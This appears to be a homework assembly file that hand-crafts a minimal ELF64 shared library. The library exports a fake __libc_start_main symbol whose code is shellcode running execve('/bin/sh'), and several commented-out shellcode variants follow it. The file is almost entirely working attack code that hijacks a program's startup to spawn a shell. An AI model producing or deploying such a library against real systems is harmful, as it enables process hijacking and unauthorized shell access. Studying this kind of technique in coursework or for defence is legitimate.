; HW_4.asm
BITS 64
ehdr:                                          ; ELF64_Ehdr
        db  0x7F, "ELF", 2, 1, 1, 0            ; e_indent
times 8 db  0                                  ; EI_PAD
        dw  3                                  ; e_type
        dw  0x3e                               ; e_machine
        dd  1                                  ; e_version
        dq  __libc_start_main                  ; e_entry
        dq  phdr0 - $$                         ; e_phoff
        dq  shdrnull - $$                         ; e_shoff
        dd  0                                  ; e_flags
        dw  ehdrsize                           ; e_ehsize
        dw  phdrsize                           ; e_phentsize
        dw  3                                  ; e_phnum
        dw  shdrsize                           ; e_shentsize
        dw  6                                  ; e_shnum
        dw  1                                  ; e_shstrndx

ehdrsize    equ $ - ehdr

phdr0:                                         ; ELF64_Phdr
        dd  1                                  ; p_type
        dd  5                                  ; p_flags
        dq  0                                  ; p_offset
        dq  $$                                 ; p_vaddr
        dq  $$                                 ; p_paddr
        dq  filesize                           ; p_filesz
        dq  filesize                           ; p_memsz
        dq  0x00200000                         ; p_align

phdrsize    equ $ - phdr0

phdr1:
        dd  1                                  ; p_type
        dd  6                                  ; p_flags
        dq  dynamic - $$                       ; p_offset
        dq  dynamic - $$ + 0x00200000          ; p_vaddr
        dq  dynamic - $$ + 0x00200000          ; p_paddr
        dq  dynamicsize                        ; p_filesz
        dq  dynamicsize                        ; p_memsz
        dq  0x00200000                         ; p_align

phdr2:
        dd  2                                  ; p_type
        dd  6                                  ; p_flags
        dq  dynamic - $$                       ; p_offset
        dq  dynamic - $$ + 0x00200000          ; p_vaddr
        dq  dynamic - $$ + 0x00200000          ; p_paddr
        dq  dynamicsize                        ; p_filesz
        dq  dynamicsize                        ; p_memsz
        dq  0x00200000                         ; p_align

hash:

        dd  1
        dd  2
        dd  1
        dd  0, 0
hashsize equ $ - hash


dynsym:

; symbol: none
    ; name
    dd 0
    ; type
    db 0
    ; visibility
    db 0
    ; shndx
    dw 0
    ; value
    dq 0
    ; size
    dq 0

; symbol: __libc_start_main
    ; name
    dd lsm - sb
    ; type
    db 18
    ; visibility
    db 0
    ; shndx
    dw 1
    ; value
    dq __libc_start_main - $$
    ; size
    dq 0

dynsymsize equ $ - dynsym

dynstr:
sb  db 0
lsm db "__libc_start_main"
    db 0

dynstrsize equ $ - dynstr

text:

__libc_start_main:

        xor rdx, rdx
        mov rbx, 0x0068732f6e69622f
        push    rbx
        mov rdi, rsp
        xor rax,rax
        push    rax
        push    rdi
        mov rsi,rsp
        mov al, 0x3b    ; execve(3b)
        syscall

        ; xor rdx, rdx
        ; mov rbx, 0x68732f6e69622fff
        ; shr rbx, 0x8
        ; push    rbx
        ; mov rdi, rsp
        ; xor rax,rax
        ; push    rax
        ; push    rdi
        ; mov rsi,rsp
        ; mov al, 0x3b    ; execve(3b)
        ; syscall

        ; push    0x1
        ; pop rdi
        ; push    0x3c        ; exit(3c)
        ; pop rax
        ; syscall
        ; xor rsi,rsi
        ; push rsi
        ; mov rdi, 0x68732f2f6e69622f
        ; push rdi
        ; push rsp
        ; pop rdi
        ; push 59
        ; pop rax
        ; cdq
        ; syscall

textsize equ $ - text
filesize equ $ - $$

dynamic:

    dq 4
    dq hash

    dq 5
    dq dynstr

    dq 6
    dq dynsym

    dq 10
    dq dynstrsize

    dq 11
    dq 24

dynamicsize equ $ - dynamic

shstrtab:
    db 0
s0  db ".shstrtab"
    db 0
s1  db ".dynsym"
    db 0
s2  db ".dynstr"
    db 0
s3  db ".text"
    db 0
s4  db ".dynamic"
    db 0
s5  db ".hash"
    db 0

shstrtabsize equ $ - shstrtab

shdrnull:

        dd 0
        ; type
        dd 0
        ; flags
        dq 0
        ; virt addr
        dq 0
        ; offset
        dq 0
        ; size
        dq 0
        ; link index
        dd 0
        ; info
        dd 0
        ; align
        dq 0
        ; entsize
        dq 0

shdr4: ;.shstrtab
        dd s0 - shstrtab
        dd 3
        dq 0
        dq 0
        dq shstrtab - $$
        dq shstrtabsize
        dd 0
        dd 0
        dq 1
        dq 0

shdrsize    equ $ - shdr4

shdrhash: ;.hash
        ; name
        dd s5 - shstrtab
        ; type
        dd 5
        ; flags
        dq 2
        ; virt addr
        dq hash - $$
        ; offset
        dq hash - $$
        ; size
        dq hashsize
        ; link index
        dd 2
        ; info
        dd 0
        ; align
        dq 8
        ; entsize
        dq 4

shdr0: ;.dynsym
        ; name
        dd s1 - shstrtab
        ; type
        dd 11
        ; flags
        dq 2
        ; virt addr
        dq dynsym - $$
        ; offset
        dq dynsym - $$
        ; size
        dq dynsymsize
        ; link index
        dd 3
        ; info
        dd 2
        ; align
        dq 8
        ; entsize
        dq 24

shdr1: ;.dynstr
        ; name
        dd s2 - shstrtab
        ; type
        dd 3
        ; flags
        dq 2
        ; virt addr
        dq dynstr - $$
        ; offset
        dq dynstr - $$
        ; size
        dq dynstrsize
        ; link index
        dd 0
        ; info
        dd 0
        ; align
        dq 1
        ; entsize
        dq 0

shdr3: ;.dynamic
        ; name
        dd s4 - shstrtab
        ; type
        dd 6
        ; flags
        dq 3
        ; virt addr
        dq dynamic - $$ + 0x00200000
        ; offset
        dq dynamic - $$
        ; size
        dq dynamicsize
        ; link index
        dd 3
        ; info
        dd 0
        ; align
        dq 8
        ; entsize
        dq 16

